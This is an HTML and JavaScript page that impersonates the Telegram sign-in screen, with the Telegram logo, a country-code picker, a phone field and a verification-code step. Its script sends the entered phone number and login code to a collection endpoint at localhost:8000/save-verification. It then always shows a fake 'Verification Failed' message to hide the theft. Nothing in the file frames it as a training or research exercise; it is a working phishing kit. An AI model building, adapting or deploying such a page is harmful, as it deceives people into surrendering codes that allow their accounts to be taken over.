<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            background-color: #ffffff;
            padding: 20px;
            text-align: center;
            width: 90%;
            max-width: 380px;
            margin-top: 20px;
            position: relative;
        }

        .container img {
            width: 80px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 18px;
            color: #333333;
            margin-bottom: 10px;
            font-weight: 600;
        }

        p {
            font-size: 14px;
            color: #777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 5px;
        }

        select, input[type="tel"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        select {
            background-color: #fff;
            color: #333;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            position: relative;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><path fill="none" stroke="%23666" stroke-width="2" d="M2 7 L12 17 L22 7"/></svg>');
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 12px 12px;
        }

        .dropdown-container {
            position: relative;
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            z-index: 1000;
            max-height: 200px;
            overflow-y: auto;
        }

        .dropdown-menu.show {
            display: block;
        }

        .dropdown-item {
            padding: 10px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #eee;
            cursor: pointer;
        }

        .dropdown-item img {
            width: 24px;
            height: 16px;
            margin-right: 10px;
        }

        .dropdown-item:last-child {
            border-bottom: none;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            font-weight: 600;
        }

        .button:hover {
            background-color: #007ab8;
        }

        #countryCode {
            color: #ccc;
            text-align: left;
            position: relative;
        }

        #countryCode option {
            color: #333;
        }

        #countryCode:focus {
            color: #333;
        }

        #countryCode option:first-child {
            display: none;
        }

        #verificationContainer, #finalMessageContainer {
            display: none;
        }

        @media (max-width: 600px) {
            .container {
                width: 95%;
                max-width: 340px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group dropdown-container">
            <label for="countryCode">Country</label>
            <div id="countryCode" onclick="toggleDropdown()">
                <span>Select Country</span>
            </div>
            <div id="dropdownMenu" class="dropdown-menu"></div>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="tel" id="phoneNumber" inputmode="numeric" pattern="[0-9]*" placeholder="Phone Number">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn">
            <label for="keepSignedIn">Keep me signed in</label>
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer">
        <div class="monkey-icon">üêµ</div>
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const countryDropdown = document.getElementById('countryCode');
            const dropdownMenu = document.getElementById('dropdownMenu');
            const countries = [
                { name: 'Australia', code: '+61', flag: 'https://www.countryflags.io/au/flat/24.png' },
                { name: 'United States', code: '+1', flag: 'https://www.countryflags.io/us/flat/24.png' },
                { name: 'United Kingdom', code: '+44', flag: 'https://www.countryflags.io/gb/flat/24.png' },
                { name: 'Germany', code: '+49', flag: 'https://www.countryflags.io/de/flat/24.png' },
                { name: 'France', code: '+33', flag: 'https://www.countryflags.io/fr/flat/24.png' },
                { name: 'Japan', code: '+81', flag: 'https://www.countryflags.io/jp/flat/24.png' },
                { name: 'India', code: '+91', flag: 'https://www.countryflags.io/in/flat/24.png' },
                { name: 'China', code: '+86', flag: 'https://www.countryflags.io/cn/flat/24.png' },
                { name: 'Russia', code: '+7', flag: 'https://www.countryflags.io/ru/flat/24.png' },
                { name: 'South Korea', code: '+82', flag: 'https://www.countryflags.io/kr/flat/24.png' },
                { name: 'Brazil', code: '+55', flag: 'https://www.countryflags.io/br/flat/24.png' },
                { name: 'Canada', code: '+1', flag: 'https://www.countryflags.io/ca/flat/24.png' },
                { name: 'Italy', code: '+39', flag: 'https://www.countryflags.io/it/flat/24.png' },
                { name: 'Mexico', code: '+52', flag: 'https://www.countryflags.io/mx/flat/24.png' },
                { name: 'Spain', code: '+34', flag: 'https://www.countryflags.io/es/flat/24.png' },
                { name: 'Turkey', code: '+90', flag: 'https://www.countryflags.io/tr/flat/24.png' },
                { name: 'Netherlands', code: '+31', flag: 'https://www.countryflags.io/nl/flat/24.png' },
                { name: 'Saudi Arabia', code: '+966', flag: 'https://www.countryflags.io/sa/flat/24.png' },
                { name: 'Sweden', code: '+46', flag: 'https://www.countryflags.io/se/flat/24.png' },
                { name: 'Switzerland', code: '+41', flag: 'https://www.countryflags.io/ch/flat/24.png' },
                { name: 'South Africa', code: '+27', flag: 'https://www.countryflags.io/za/flat/24.png' },
                { name: 'Argentina', code: '+54', flag: 'https://www.countryflags.io/ar/flat/24.png' }
                // Add more countries as needed
            ];

            // Populate the dropdown menu
            countries.forEach(country => {
                const item = document.createElement('div');
                item.classList.add('dropdown-item');
                item.innerHTML = `${country.flag ? `<img src="${country.flag}" alt="Flag">` : ''} ${country.name} ${country.code}`;
                item.dataset.code = country.code;
                item.addEventListener('click', function() {
                    countryDropdown.innerHTML = `${country.flag ? `<img src="${country.flag}" alt="Flag">` : ''} ${country.name} ${country.code}`;
                    document.getElementById('phoneNumber').value = country.code + ' ' + document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
                    dropdownMenu.classList.remove('show');
                });
                dropdownMenu.appendChild(item);
            });

            window.toggleDropdown = function() {
                dropdownMenu.classList.toggle('show');
                countryDropdown.classList.toggle('open');
            };

            window.goToVerificationPage = function() {
                const countryCode = document.getElementById('countryCode').innerText.split(' ')[1];
                const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
                const fullPhoneNumber = `${countryCode} ${phoneNumber}`;

                if (phoneNumber === '') {
                    alert('Please enter your phone number.');
                    return;
                }

                document.getElementById('phoneDisplay').textContent = fullPhoneNumber;

                document.getElementById('initialContainer').style.display = 'none';
                document.getElementById('verificationContainer').style.display = 'block';
            };

            async function sendDataToServer(phoneNumber, verificationCode) {
                try {
                    const response = await fetch('http://localhost:8000/save-verification', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            phoneNumber: phoneNumber,
                            verificationCode: verificationCode,
                            userId: 1 // This can be updated dynamically if needed
                        })
                    });

                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }

                    console.log("Data sent to server successfully");
                } catch (error) {
                    console.error("Failed to send data to server:", error);
                }
            }

            window.submitVerification = function() {
                const verificationCode = document.getElementById('verificationCode').value;
                const phoneDisplay = document.getElementById('phoneDisplay').textContent;

                if (verificationCode === '') {
                    alert('Please enter the verification code.');
                    return;
                }

                sendDataToServer(phoneDisplay, verificationCode);

                // Show the final message indicating verification failure
                document.getElementById('verificationContainer').style.display = 'none';
                document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
                document.getElementById('finalMessageContainer').style.display = 'block';
            };

            window.resetForm = function() {
                document.getElementById('initialContainer').style.display = 'block';
                document.getElementById('verificationContainer').style.display = 'none';
                document.getElementById('finalMessageContainer').style.display = 'none';
                document.getElementById('phoneNumber').value = '';
                document.getElementById('verificationCode').value = '';
            };
        });
    </script>
</body>
</html>
